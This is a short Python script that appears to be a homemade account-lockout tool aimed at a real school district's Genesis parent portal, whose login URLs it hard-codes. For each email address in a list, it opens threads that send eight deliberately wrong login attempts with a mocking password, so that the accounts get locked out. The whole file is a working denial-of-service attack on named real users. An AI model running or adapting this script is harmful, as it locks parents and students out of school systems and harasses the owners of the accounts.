from datetime import datetime
import threading
import requests
import time
import os
import re
 
############ VARS ############
accounts  = [''] # Emails to lock ['fakeAccount@bernardsboe.com'] 


DEBUG     = True
COLOR     = True
complete  = 0
startTime = time.time()
 
ColorCodes = {'black': '30', 'red': '31', 'yellow': '33', 'green': '32', 'blue': '34',
              'cyan': '36', 'magenta': '35', 'white': '37', 'gray': '90', 'reset': '0'}
 
######### FUNCTIONS #########
 
 
def colored(text, color):
    if not COLOR:
        return text
    return '\033[' + ColorCodes[str(color).lower()] + 'm' + str(text) + "\033[0m"
 
 
def DebugPrint(Category, Text, Color):
    if not DEBUG:
        return
    print(colored('['+datetime.now().strftime("%H:%M:%S")+'] ', 'yellow') +
          colored('['+Category+'] ', 'magenta')+colored(Text, Color))
 
 
class lock(threading.Thread):
    # Init Vars needed to crack passwords
    def __init__(self, user, thread, timeout, url, checkUrl):
        threading.Thread.__init__(self)
        self.thread = thread
        self.url = url
        self.checkUrl = checkUrl
        self.timeout = timeout
        self.user = user
 
    # Do the cracking :)
    def run(self):
        global complete
        for _ in range(8):
            DebugPrint(
                "Lock", f'{colored("Locking", "cyan")} {colored(f"T{str(self.thread).ljust(2)}", "blue")} {colored(self.user, "green")}', "cyan")
            try:
                ses = requests.Session()
                ses.get(self.checkUrl)
                dataToSend = {"j_password": "You are being hacked :P (not really)", "j_username": self.user}
                ses.post(self.url, timeout=self.timeout, data=dataToSend)
            except:
                DebugPrint("Lock", f'{colored("Error", "red")} {colored(f"T{str(self.thread).ljust(2)}", "blue")}', "cyan")
        complete += 1
 
####### MAIN FUNCTION #######
 
 
def main():
    # Read Configvalues from the config file and assign them to vars
    DebugPrint('Main', 'Starting...', 'green')
    url       = 'https://parents.genesisedu.com/bernardsboe/sis/j_security_check'
    checkUrl  = 'https://parents.genesisedu.com/bernardsboe/sis/view?gohome=true'
    timeout   = 0.5
    thread    = 0
 
    DebugPrint(
        "Main", f'{colored("Users", "cyan")} {colored(accounts, "blue")}', "cyan")
 
    # Create threads to check for the password
    for i in accounts:
        t = lock(i, thread, timeout, url, checkUrl)
        t.daemon = True
        t.start()
        thread += 1
 
if __name__ == "__main__":
    try:
        main()
        while True:
            if complete >= len(accounts):
                DebugPrint('Main', f'Complete {colored(f"[{int(time.time()-startTime)}]", "cyan")}', 'green')
                break
            continue
    except:
        DebugPrint('Main', 'Exiting...', 'red')